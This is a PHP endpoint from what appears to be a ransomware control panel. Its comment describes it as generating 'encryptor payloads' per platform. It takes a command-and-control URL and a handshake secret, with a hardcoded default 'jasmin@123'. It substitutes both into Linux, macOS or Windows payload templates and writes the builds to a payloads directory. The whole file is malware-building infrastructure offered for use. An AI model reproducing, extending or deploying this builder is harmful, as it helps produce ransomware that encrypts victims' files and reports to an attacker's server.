<?php
/**
 * 载荷生成API — 根据平台生成对应加密器载荷
 * POST /generate.php  { platform: win|linux|macos, c2_url: ..., callback: ... }
 */
require_once __DIR__ . '/includes/auth.php';
require_once __DIR__ . '/includes/csrf.php';
require_auth();

header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['ok'=>false,'msg'=>'POST only']);
    exit;
}

$platform = $_POST['platform'] ?? '';
$c2_url   = trim($_POST['c2_url'] ?? '');
$secret   = trim($_POST['secret'] ?? 'jasmin@123');

$valid = ['win','linux','macos'];
if (!in_array($platform, $valid)) {
    echo json_encode(['ok'=>false,'msg'=>'Invalid platform']);
    exit;
}

$out_dir = __DIR__ . '/payloads';
if (!is_dir($out_dir)) mkdir($out_dir, 0750, true);

$ts = date('Ymd_His');
$token = bin2hex(random_bytes(4));

if ($platform === 'linux') {
    $result = generate_linux($c2_url, $secret, $out_dir, $ts, $token);
} elseif ($platform === 'macos') {
    $result = generate_macos($c2_url, $secret, $out_dir, $ts, $token);
} else {
    $result = generate_windows($c2_url, $secret, $out_dir, $ts, $token);
}

echo json_encode($result);
exit;

function generate_linux($c2, $secret, $dir, $ts, $tok) {
    $name = "jasmin_linux_{$ts}_{$tok}.py";
    $path = "{$dir}/{$name}";
    $tpl = file_get_contents(__DIR__ . '/templates/linux_payload.tpl');
    $tpl = str_replace('{{C2_URL}}', $c2, $tpl);
    $tpl = str_replace('{{HANDSHAKE}}', $secret, $tpl);
    file_put_contents($path, $tpl);
    chmod($path, 0750);
    return ['ok'=>true,'file'=>$name,'platform'=>'linux','size'=>filesize($path)];
}

function generate_macos($c2, $secret, $dir, $ts, $tok) {
    $name = "jasmin_macos_{$ts}_{$tok}.py";
    $path = "{$dir}/{$name}";
    $tpl = file_get_contents(__DIR__ . '/templates/macos_payload.tpl');
    $tpl = str_replace('{{C2_URL}}', $c2, $tpl);
    $tpl = str_replace('{{HANDSHAKE}}', $secret, $tpl);
    file_put_contents($path, $tpl);
    chmod($path, 0750);
    return ['ok'=>true,'file'=>$name,'platform'=>'macos','size'=>filesize($path)];
}

function generate_windows($c2, $secret, $dir, $ts, $tok) {
    $name = "jasmin_win_{$ts}_{$tok}.cs";
    $path = "{$dir}/{$name}";
    $tpl = file_get_contents(__DIR__ . '/templates/win_payload.tpl');
    $tpl = str_replace('{{C2_URL}}', $c2, $tpl);
    $tpl = str_replace('{{HANDSHAKE}}', $secret, $tpl);
    file_put_contents($path, $tpl);
    return ['ok'=>true,'file'=>$name,'platform'=>'windows','size'=>filesize($path)];
}
